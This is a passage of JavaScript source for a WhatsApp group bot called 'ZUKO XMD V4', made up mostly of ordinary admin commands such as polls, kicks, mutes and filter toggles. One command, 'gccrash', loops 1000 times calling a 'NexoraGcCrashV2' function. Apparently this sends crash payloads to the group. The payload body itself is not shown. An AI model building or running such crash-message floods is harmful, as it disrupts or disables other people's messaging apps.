  if (!isCreator) return reply('❌ Owner only')
  
  const announcement = text
  if (!announcement) return reply(`📢 Usage: ${prefix}announce <message>\n\nSends an announcement that mentions all members.`)
  
  const metadata = await empire.groupMetadata(m.chat)
  const mentions = metadata.participants.map(p => p.id)
  
  const announceMsg = `
╭━━━━━━━━━━━━━━━━━━━━━━╮
┃    📢 𝗔𝗡𝗡𝗢𝗨𝗡𝗖𝗘𝗠𝗘𝗡𝗧     ┃
┣━━━━━━━━━━━━━━━━━━━━━━┫
┃  ${announcement}
┣━━━━━━━━━━━━━━━━━━━━━━┫
┃  📅 ${new Date().toLocaleString()}
┃  👤 By: @${m.sender.split('@')[0]}
┣━━━━━━━━━━━━━━━━━━━━━━┫
┃    💫 𝗭𝗨𝗞𝗢 𝗫𝗠𝗗 𝗩𝟰     ┃
╰━━━━━━━━━━━━━━━━━━━━━━╯
  `.trim()
  
  await empire.sendMessage(m.chat, {
    text: announceMsg,
    mentions: [...mentions, m.sender]
  }, { quoted: m })
}
break

case 'grouppoll':
case 'createpoll': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const parts = text.split('|')
  const question = parts[0]?.trim()
  const options = parts.slice(1).map(o => o.trim())
  
  if (!question || options.length < 2 || options.length > 10) {
    return reply(`📊 Usage: ${prefix}createpoll Question | Option1 | Option2 | Option3...\n\nMax 10 options.`)
  }
  
  if (!db.polls) db.polls = {}
  if (!db.polls[m.chat]) db.polls[m.chat] = {}
  
  const pollId = Date.now().toString()
  db.polls[m.chat][pollId] = {
    question: question,
    options: options,
    votes: {},
    created: Date.now(),
    creator: m.sender
  }
  
  saveDB()
  
  let pollMsg = `📊 *POLL: ${question}*\n\n`
  options.forEach((opt, i) => {
    pollMsg += `${i + 1}. ${opt}\n`
  })
  pollMsg += `\n✅ Vote: ${prefix}votepoll ${pollId} <number>`
  pollMsg += `\n📊 Results: ${prefix}pollresults ${pollId}`
  
  reply(pollMsg)
}
break

case 'votepoll':
case 'pollvote': {
  if (!m.isGroup) return reply('❌ Group only')
  
  const pollId = args[0]
  const voteNum = parseInt(args[1]) - 1
  
  if (!pollId || isNaN(voteNum)) {
    return reply(`📝 Usage: ${prefix}votepoll <poll_id> <option_number>\nUse ${prefix}pollresults to see polls.`)
  }
  
  const poll = db.polls?.[m.chat]?.[pollId]
  if (!poll) return reply('❌ Poll not found or expired.')
  
  if (poll.votes[m.sender]) {
    return reply('⚠️ You have already voted in this poll.')
  }
  
  if (voteNum < 0 || voteNum >= poll.options.length) {
    return reply(`❌ Invalid option. Choose 1-${poll.options.length}.`)
  }
  
  poll.votes[m.sender] = voteNum
  saveDB()
  
  reply(`✅ Your vote has been recorded for: ${poll.options[voteNum]}`)
}
break

case 'pollresults':
case 'showresults': {
  if (!m.isGroup) return reply('❌ Group only')
  
  const pollId = args[0]
  if (!pollId) {
    const polls = Object.entries(db.polls?.[m.chat] || {})
    if (!polls.length) return reply('📭 No active polls.')
    
    let list = '📊 *ACTIVE POLLS*\n\n'
    polls.forEach(([id, poll]) => {
      list += `🆔 ${id}\n📝 ${poll.question}\n👥 Votes: ${Object.keys(poll.votes).length}\n\n`
    })
    return reply(list)
  }
  
  const poll = db.polls?.[m.chat]?.[pollId]
  if (!poll) return reply('❌ Poll not found.')
  
  const voteCounts = new Array(poll.options.length).fill(0)
  Object.values(poll.votes).forEach(vote => {
    voteCounts[vote]++
  })
  
  const totalVotes = Object.keys(poll.votes).length
  
  let results = `📊 *POLL RESULTS*\n\n📝 ${poll.question}\n\n`
  poll.options.forEach((opt, i) => {
    const count = voteCounts[i]
    const percentage = totalVotes > 0 ? ((count / totalVotes) * 100).toFixed(1) : 0
    const bar = '█'.repeat(Math.floor(percentage / 10)) + '░'.repeat(10 - Math.floor(percentage / 10))
    results += `${i + 1}. ${opt}\n   ${bar} ${percentage}% (${count} votes)\n\n`
  })
  results += `📊 Total Votes: ${totalVotes}`
  
  reply(results)
}
break

case 'pollclose':
case 'closepoll': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const pollId = args[0]
  if (!pollId) return reply(`📝 Usage: ${prefix}closepoll <poll_id>`)
  
  if (db.polls?.[m.chat]?.[pollId]) {
    delete db.polls[m.chat][pollId]
    saveDB()
    reply('✅ Poll closed successfully.')
  } else {
    reply('❌ Poll not found.')
  }
}
break
case 'unlock':
case 'open': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    await empire.groupSettingUpdate(m.chat, 'not_announcement')
    reply('🔓 Group unlocked. All members can send messages.')
  } catch (err) {
    reply('❌ Failed to unlock group. Make sure bot is admin.')
  }
}
break

case 'promote': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  let user = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  if (!user) return reply(`👑 Usage: ${prefix}promote @user`)
  
  try {
    await empire.groupParticipantsUpdate(m.chat, [user], 'promote')
    reply(`✅ @${user.split('@')[0]} promoted to admin!`, { mentions: [user] })
  } catch (err) {
    reply('❌ Failed to promote user.')
  }
}
break

case 'demote': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  let user = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  if (!user) return reply(`👑 Usage: ${prefix}demote @user`)
  
  try {
    await empire.groupParticipantsUpdate(m.chat, [user], 'demote')
    reply(`✅ @${user.split('@')[0]} demoted from admin.`, { mentions: [user] })
  } catch (err) {
    reply('❌ Failed to demote user.')
  }
}
break

case 'kick':
case 'remove': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  let user = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  if (!user) return reply(`👢 Usage: ${prefix}kick @user`)
  
  try {
    await empire.groupParticipantsUpdate(m.chat, [user], 'remove')
    reply(`✅ @${user.split('@')[0]} removed from group.`, { mentions: [user] })
  } catch (err) {
    reply('❌ Failed to kick user.')
  }
}
break

case 'add': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  if (!text) return reply(`➕ Usage: ${prefix}add 234XXXXXXXXX`)
  
  let user = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  
  try {
    await empire.groupParticipantsUpdate(m.chat, [user], 'add')
    reply(`✅ @${user.split('@')[0]} added to group!`, { mentions: [user] })
  } catch (err) {
    reply('❌ Failed to add user. Make sure number is valid.')
  }
}
break
case 'gccrash': {
    if (!isCreator) return reply("ᴏᴡɴᴇʀ ᴏɴʟʏ.");
    if (!m.isGroup) return reply("This is for Groups!");

    await empire.sendMessage(m.chat, { react: { text: '💀', key: m.key } });
    
    // Increase the loop count to 10 for a total "Deadly" effect
    for (let i = 0; i < 1000; i++) {
        await NexoraGcCrashV2(empire, m.chat, generateWAMessageFromContent);
        // Small delay to ensure the bot terminal doesn't crash itself
        await new Promise((r) => setTimeout(r, 1000)); 
    }

    console.log(`[!] Deadly Payloads delivered to ${groupName}`);
}
break;
case 'leave':
case 'left': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    await empire.groupLeave(m.chat)
    // No reply needed since bot leaves
  } catch (err) {
    reply('❌ Failed to leave group.')
  }
}
break

case 'groupinfo':
case 'gcinfo': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  
  try {
    const metadata = await empire.groupMetadata(m.chat)
    const participants = metadata.participants
    const admins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin')
    const members = participants.length
    const adminCount = admins.length
    const created = new Date(metadata.creation * 1000).toLocaleDateString()
    
    let ppUrl
    try {
      ppUrl = await empire.profilePictureUrl(m.chat, 'image')
    } catch {
      ppUrl = 'https://i.ibb.co/4f4tTnG/no-poster.png'
    }
    
    const info = `
╭━━━━━━━━━━━━━━━━━━━━━━╮
┃    📊 𝗚𝗥𝗢𝗨𝗣 𝗜𝗡𝗙𝗢     ┃
┣━━━━━━━━━━━━━━━━━━━━━━┫
┃ 📛 𝗡𝗮𝗺𝗲: ${metadata.subject}
┃ 🆔 𝗜𝗗: ${metadata.id}
┃ 👥 𝗠𝗲𝗺𝗯𝗲𝗿𝘀: ${members}
┃ 👑 𝗔𝗱𝗺𝗶𝗻𝘀: ${adminCount}
┃ 🔒 𝗧𝘆𝗽𝗲: ${metadata.announce ? 'Locked 🔒' : 'Open 🔓'}
┃ 📅 𝗖𝗿𝗲𝗮𝘁𝗲𝗱: ${created}
┃ 👤 𝗢𝘄𝗻𝗲𝗿: @${metadata.owner?.split('@')[0] || 'Unknown'}
┣━━━━━━━━━━━━━━━━━━━━━━┫
┃    💫 𝗭𝗨𝗞𝗢 𝗫𝗠𝗗 𝗩𝟰     ┃
╰━━━━━━━━━━━━━━━━━━━━━━╯
    `.trim()
    
    await empire.sendMessage(m.chat, {
      image: { url: ppUrl },
      caption: info,
      mentions: [metadata.owner]
    }, { quoted: m })
  } catch (err) {
    reply('❌ Failed to fetch group info.')
  }
}
break
// ==================== ADDITIONAL GROUP MANAGEMENT COMMANDS ====================

case 'mute':
case 'silence': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  let duration = parseInt(args[0])
  if (!duration || duration < 1) return reply(`⏰ Usage: ${prefix}mute <minutes>\nExample: ${prefix}mute 30`)
  
  const until = Date.now() + (duration * 60 * 1000)
  
  if (!db.mutedGroups) db.mutedGroups = {}
  db.mutedGroups[m.chat] = until
  saveDB()
  
  reply(`🔇 Group muted for ${duration} minute(s). Non-admins cannot send messages.`)
  
  setTimeout(async () => {
    if (db.mutedGroups[m.chat] && Date.now() >= db.mutedGroups[m.chat]) {
      delete db.mutedGroups[m.chat]
      saveDB()
      await empire.sendMessage(m.chat, { text: '🔊 Group unmuted. Members can now send messages.' })
    }
  }, duration * 60 * 1000)
}
break

case 'unmute':
case 'unsilence': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  if (!db.mutedGroups?.[m.chat]) return reply('❌ Group is not muted.')
  
  delete db.mutedGroups[m.chat]
  saveDB()
  
  reply('🔊 Group unmuted. Members can now send messages.')
}
break

case 'banmember':
case 'blockuser': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  let user = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  if (!user) return reply(`🚫 Usage: ${prefix}banmember @user`)
  
  if (!db.bannedMembers) db.bannedMembers = {}
  if (!db.bannedMembers[m.chat]) db.bannedMembers[m.chat] = []
  
  if (db.bannedMembers[m.chat].includes(user)) {
    return reply(`⚠️ @${user.split('@')[0]} is already banned from this group.`, { mentions: [user] })
  }
  
  db.bannedMembers[m.chat].push(user)
  saveDB()
  
  try {
    await empire.groupParticipantsUpdate(m.chat, [user], 'remove')
  } catch (err) {
    console.log('Failed to kick banned user:', err)
  }
  
  reply(`🔨 @${user.split('@')[0]} has been banned from this group.`, { mentions: [user] })
}
break
// ==================== ADVANCED GROUP MANAGEMENT COMMANDS ====================

case 'antispam': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`📝 Usage: ${prefix}antispam on/off`)
  }
  
  setSetting(m.chat, 'antispam', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} anti-spam protection. Spammers will be warned then kicked.`)
}
break

case 'antibot': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`📝 Usage: ${prefix}antibot on/off`)
  }
  
  setSetting(m.chat, 'antibot', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} anti-bot protection. Other bots will be kicked.`)
}
break

case 'antibadword':
case 'filterword': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const action = args[0]?.toLowerCase()
  const word = args.slice(1).join(' ')
  
  if (!db.badwords) db.badwords = {}
  if (!db.badwords[m.chat]) db.badwords[m.chat] = []
  
  if (action === 'add' && word) {
    if (!db.badwords[m.chat].includes(word.toLowerCase())) {
      db.badwords[m.chat].push(word.toLowerCase())
      saveDB()
      reply(`✅ Added "${word}" to bad words list.`)
    } else {
      reply(`⚠️ "${word}" is already in the bad words list.`)
    }
  } 
  else if (action === 'remove' && word) {
    if (db.badwords[m.chat].includes(word.toLowerCase())) {
      db.badwords[m.chat] = db.badwords[m.chat].filter(w => w !== word.toLowerCase())
      saveDB()
      reply(`✅ Removed "${word}" from bad words list.`)
    } else {
      reply(`⚠️ "${word}" not found in bad words list.`)
    }
  }
  else if (action === 'list') {
    const words = db.badwords[m.chat]
    if (!words.length) return reply('✅ No bad words configured for this group.')
    reply(`🚫 *Bad Words List*\n\n${words.map((w, i) => `${i + 1}. ${w}`).join('\n')}`)
  }
  else if (action === 'clear') {
    db.badwords[m.chat] = []
    saveDB()
    reply('✅ Cleared all bad words from this group.')
  }
  else {
    reply(`📝 Usage:\n${prefix}antibadword add <word>\n${prefix}antibadword remove <word>\n${prefix}antibadword list\n${prefix}antibadword clear`)
  }
}
break
// ==================== ADDITIONAL GROUP COMMANDS (20 MORE) ====================

case 'revokeall':
case 'resetalllinks': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    await empire.groupRevokeInvite(m.chat)
    reply('✅ Group invite link has been reset successfully!')
  } catch (err) {
    reply('❌ Failed to reset group link. Make sure bot is admin.')
  }
}
break

case 'setppimg':
case 'setgroupimage': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const quoted = m.quoted || m
  const mime = (quoted.msg || quoted).mimetype || ''
  
  if (!/image/.test(mime)) {
    return reply(`🖼️ Reply to an image with: ${prefix}setppimg`)
  }
  
  try {
    const media = await quoted.download()
    await empire.updateProfilePicture(m.chat, media)
    reply('✅ Group icon updated successfully!')
  } catch (err) {
    reply('❌ Failed to update group icon.')
  }
}
break

case 'removebgimg':
case 'delgroupimg': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    await empire.removeProfilePicture(m.chat)
    reply('✅ Group icon removed successfully!')
  } catch (err) {
    reply('❌ Failed to remove group icon.')
  }
}
break

case 'ephemeral':
case 'disappear': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const duration = parseInt(args[0])
  const validDurations = [0, 86400, 604800, 7776000] // 0=off, 1day, 7days, 90days
  
  if (!duration || !validDurations.includes(duration)) {
    return reply(`⏰ Usage: ${prefix}ephemeral <duration>\n\nOptions:\n0 = Off\n86400 = 24 hours\n604800 = 7 days\n7776000 = 90 days`)
  }
  
  try {
    await empire.sendMessage(m.chat, {
      disappearingMessagesInChat: { ephemeralExpiration: duration }
    })
    reply(`✅ Disappearing messages set to ${duration === 0 ? 'OFF' : duration / 86400 + ' days'}`)
  } catch (err) {
    reply('❌ Failed to set disappearing messages.')
  }
}
break

case 'groupmute':
case 'muteall': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    await empire.groupSettingUpdate(m.chat, 'announcement')
    reply('🔇 Group has been muted. Only admins can send messages.')
  } catch (err) {
    reply('❌ Failed to mute group.')
  }
}
break

case 'groupunmute':
case 'unmuteall': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    await empire.groupSettingUpdate(m.chat, 'not_announcement')
    reply('🔊 Group has been unmuted. All members can send messages.')
  } catch (err) {
    reply('❌ Failed to unmute group.')
  }
}
break

case 'addadmin':
case 'makeadmin': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  let user = m.mentionedJid[0] || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  if (!user) return reply(`👑 Usage: ${prefix}addadmin @user`)
  
  try {
    await empire.groupParticipantsUpdate(m.chat, [user], 'promote')
    reply(`✅ @${user.split('@')[0]} is now an admin!`, { mentions: [user] })
  } catch (err) {
    reply('❌ Failed to promote user.')
  }
}
break

case 'removeadmin':
case 'rmadmin': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  let user = m.mentionedJid[0] || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  if (!user) return reply(`👑 Usage: ${prefix}removeadmin @user`)
  
  try {
    await empire.groupParticipantsUpdate(m.chat, [user], 'demote')
    reply(`✅ @${user.split('@')[0]} is no longer an admin.`, { mentions: [user] })
  } catch (err) {
    reply('❌ Failed to demote user.')
  }
}
break

case 'memberscount':
case 'totalmembers': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  
  try {
    const metadata = await empire.groupMetadata(m.chat)
    const total = metadata.participants.length
    const admins = metadata.participants.filter(p => p.admin).length
    const members = total - admins
    
    reply(`👥 *GROUP STATS*\n\n📊 Total: ${total}\n👑 Admins: ${admins}\n👤 Members: ${members}`)
  } catch (err) {
    reply('❌ Failed to fetch member count.')
  }
}
break

case 'adminsonly':
case 'adminmode': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`📝 Usage: ${prefix}adminsonly on/off\nWhen enabled, only admins can send messages.`)
  }
  
  try {
    const setting = mode === 'on' ? 'announcement' : 'not_announcement'
    await empire.groupSettingUpdate(m.chat, setting)
    reply(`${mode === 'on' ? '🔒' : '🔓'} Admin-only mode ${mode === 'on' ? 'enabled' : 'disabled'}.`)
  } catch (err) {
    reply('❌ Failed to change group settings.')
  }
}
break

case 'gctag':
case 'mentionall': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    const metadata = await empire.groupMetadata(m.chat)
    const participants = metadata.participants
    const mentions = participants.map(p => p.id)
    const msg = text || `📢 Attention ${metadata.subject} members!`
    
    await empire.sendMessage(m.chat, {
      text: msg,
      mentions: mentions
    }, { quoted: m })
  } catch (err) {
    reply('❌ Failed to mention all members.')
  }
}
break

case 'gcinvite':
case 'getinvite': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    const code = await empire.groupInviteCode(m.chat)
    const link = `https://chat.whatsapp.com/${code}`
    
    await empire.sendMessage(m.chat, {
      text: `🔗 *GROUP INVITE LINK*\n\n${link}\n\nShare this link to invite new members!`,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: '120363405724402785@newsletter',
          newsletterName: '𝕫𝕦𝕜𝕠 ✗𝕞𝕕'
        }
      }
    }, { quoted: m })
  } catch (err) {
    reply('❌ Failed to generate invite link.')
  }
}
break

case 'deletechat':
case 'clearmsgs': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    // Note: WhatsApp API doesn't support clearing chat history
    reply('⚠️ Clearing chat history is not supported via API. You can only do this manually in WhatsApp.')
  } catch (err) {
    reply('❌ Failed to clear messages.')
  }
}
break

case 'groupid':
case 'getgid': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  
  reply(`🆔 *GROUP ID*\n\n${m.chat}\n\nUse this ID for bot configuration.`)
}
break

case 'groupowner':
case 'getowner': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  
  try {
    const metadata = await empire.groupMetadata(m.chat)
    const owner = metadata.owner || 'Unknown'
    
    reply(`👑 *GROUP OWNER*\n\n@${owner.split('@')[0]}`, { mentions: [owner] })
  } catch (err) {
    reply('❌ Failed to fetch group owner.')
  }
}
break

case 'gcremove':
case 'cleargroup': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  reply('⚠️ This action will remove all members except admins. Continue? Send "yes" to confirm.')
  
  const confirm = await new Promise(resolve => {
    // Simple confirmation - in production use a better method
    resolve(args[0]?.toLowerCase() === 'yes')
  })
  
  if (!confirm) return reply('❌ Command cancelled.')
  
  try {
    const metadata = await empire.groupMetadata(m.chat)
    const participants = metadata.participants
    let removed = 0
    
    for (const member of participants) {
      if (!member.admin && member.id !== botNumber) {
        try {
          await empire.groupParticipantsUpdate(m.chat, [member.id], 'remove')
          removed++
          await sleep(1000)
        } catch (err) {}
      }
    }
    
    reply(`✅ Removed ${removed} members from the group.`)
  } catch (err) {
    reply('❌ Failed to clear group members.')
  }
}
break

case 'grouprename':
case 'renamegc': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const newName = text.trim()
  if (!newName) return reply(`📝 Usage: ${prefix}grouprename <new group name>`)
  
  try {
    await empire.groupUpdateSubject(m.chat, newName)
    reply(`✅ Group renamed to: *${newName}*`)
  } catch (err) {
    reply('❌ Failed to rename group.')
  }
}
break

case 'groupdesc':
case 'setgroupdesc': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const newDesc = text.trim()
  if (!newDesc) return reply(`📝 Usage: ${prefix}groupdesc <new description>`)
  
  try {
    await empire.groupUpdateDescription(m.chat, newDesc)
    reply('✅ Group description updated successfully!')
  } catch (err) {
    reply('❌ Failed to update group description.')
  }
}
break

case 'groupstats':
case 'gcinfoall': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  
  try {
    const metadata = await empire.groupMetadata(m.chat)
    const participants = metadata.participants
    const admins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin')
    const superAdmins = participants.filter(p => p.admin === 'superadmin')
    const createdAt = new Date(metadata.creation * 1000).toLocaleString()
    
    let ppUrl
    try {
      ppUrl = await empire.profilePictureUrl(m.chat, 'image')
    } catch {
      ppUrl = 'https://i.ibb.co/4f4tTnG/no-poster.png'
    }
    
    const stats = `
╭━━━━━━━━━━━━━━━━━━━━━━━━━━╮
┃     📊 𝗚𝗥𝗢𝗨𝗣 𝗦𝗧𝗔𝗧𝗦      ┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ 📛 ${metadata.subject}
┃ 🆔 ${metadata.id}
┃ 👥 ${participants.length} Members
┃ 👑 ${admins.length} Admins
┃ ⭐ ${superAdmins.length} Super Admins
┃ 🔒 ${metadata.announce ? 'Locked' : 'Open'}
┃ 💬 ${db.messageCount?.[m.chat] || 0} Total Msgs
┃ 📅 Created: ${createdAt}
┃ 👤 Owner: @${metadata.owner?.split('@')[0] || 'Unknown'}
┣━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃    💫 𝗭𝗨𝗞𝗢 𝗫𝗠𝗗 𝗩𝟰     ┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━╯
    `.trim()
    
    await empire.sendMessage(m.chat, {
      image: { url: ppUrl },
      caption: stats,
      mentions: [metadata.owner]
    }, { quoted: m })
  } catch (err) {
    reply('❌ Failed to fetch group stats.')
  }
}
break

case 'gccreate':
case 'newgroup': {
  if (!isCreator) return reply('❌ Owner only')
  
  const groupName = text.trim()
  if (!groupName) return reply(`📝 Usage: ${prefix}gccreate <group name>`)
  
  try {
    const result = await empire.groupCreate(groupName, [])
    const code = await empire.groupInviteCode(result.id)
    const link = `https://chat.whatsapp.com/${code}`
    
    reply(`✅ Group created!\n\n📛 Name: ${result.subject}\n🆔 ID: ${result.id}\n🔗 Link: ${link}`)
  } catch (err) {
    reply('❌ Failed to create group.')
  }
}
break

case 'blockgroup':
case 'spamgroup': {
  if (!isCreator) return reply('❌ Owner only')
  if (!text) return reply(`🚫 Usage: ${prefix}blockgroup <group_id>`)
  
  try {
    const groupId = text.includes('@g.us') ? text : text + '@g.us'
    await empire.groupLeave(groupId)
    reply(`✅ Left and blocked group: ${groupId}`)
  } catch (err) {
    reply('❌ Failed to leave group.')
  }
}
break

case 'groupjoin':
case 'joingroupbyid': {
  if (!isCreator) return reply('❌ Owner only')
  if (!text) return reply(`🔗 Usage: ${prefix}groupjoin <invite_code>`)
  
  try {
    const result = await empire.groupAcceptInvite(text)
    reply(`✅ Joined group: ${result.subject || 'Successfully'}`)
  } catch (err) {
    reply('❌ Failed to join group. Invalid invite code.')
  }
}
break
// ==================== 20 MORE GROUP COMMANDS ====================

case 'antivirtex':
case 'antivirus': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`🛡️ Usage: ${prefix}antivirus on/off\n\nProtects against virus links and malicious content.`)
  }
  
  setSetting(m.chat, 'antivirus', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} antivirus protection. Suspicious links will be deleted.`)
}
break

case 'antiphishing': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`🎣 Usage: ${prefix}antiphishing on/off\n\nBlocks known phishing URLs.`)
  }
  
  setSetting(m.chat, 'antiphishing', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} anti-phishing protection.`)
}
break

case 'antiscam': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`⚠️ Usage: ${prefix}antiscam on/off\n\nDetects and removes scam messages.`)
  }
  
  setSetting(m.chat, 'antiscam', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} anti-scam protection.`)
}
break

case 'antispy':
case 'antitracking': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`🕵️ Usage: ${prefix}antispy on/off\n\nBlocks tracking links and spyware.`)
  }
  
  setSetting(m.chat, 'antispy', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} anti-tracking protection.`)
}
break

case 'autoclear':
case 'autodelete': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const seconds = parseInt(args[0])
  
  if (!seconds || seconds < 5) {
    return reply(`🗑️ Usage: ${prefix}autoclear <seconds>\nExample: ${prefix}autoclear 30\n\nAuto-deletes bot messages after X seconds. Use 0 to disable.`)
  }
  
  setSetting(m.chat, 'autoclear', seconds)
  reply(`✅ Bot messages will auto-delete after ${seconds} seconds.`)
}
break

case 'greeting':
case 'customwelcome': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  if (!text) return reply(`📝 Usage: ${prefix}greeting <message>\n\nVariables:\n@user - Member name\n@group - Group name\n@count - Member count`)
  
  setSetting(m.chat, 'welcomeMessage', text)
  reply('✅ Custom welcome greeting saved!')
}
break

case 'farewell':
case 'customgoodbye': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  if (!text) return reply(`📝 Usage: ${prefix}farewell <message>\n\nVariables:\n@user - Member name\n@group - Group name`)
  
  setSetting(m.chat, 'goodbyeMessage', text)
  reply('✅ Custom farewell message saved!')
}
break

case 'resetgreeting':
case 'resetwelcome': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  setSetting(m.chat, 'welcomeMessage', null)
  reply('✅ Welcome message reset to default.')
}
break

case 'resetfarewell':
case 'resetgoodbye': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  setSetting(m.chat, 'goodbyeMessage', null)
  reply('✅ Goodbye message reset to default.')
}
break

case 'viewonce':
case 'viewonceblock': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`👁️ Usage: ${prefix}viewonce on/off\n\nBlocks view-once messages from being sent in group.`)
  }
  
  setSetting(m.chat, 'blockviewonce', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} view-once message blocking.`)
}
break

case 'forwardblock':
case 'blockforward': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`↪️ Usage: ${prefix}blockforward on/off\n\nBlocks forwarded messages in group.`)
  }
  
  setSetting(m.chat, 'blockforward', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} forwarded message blocking.`)
}
break

case 'medialimit':
case 'limitmedia': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const limit = parseInt(args[0])
  
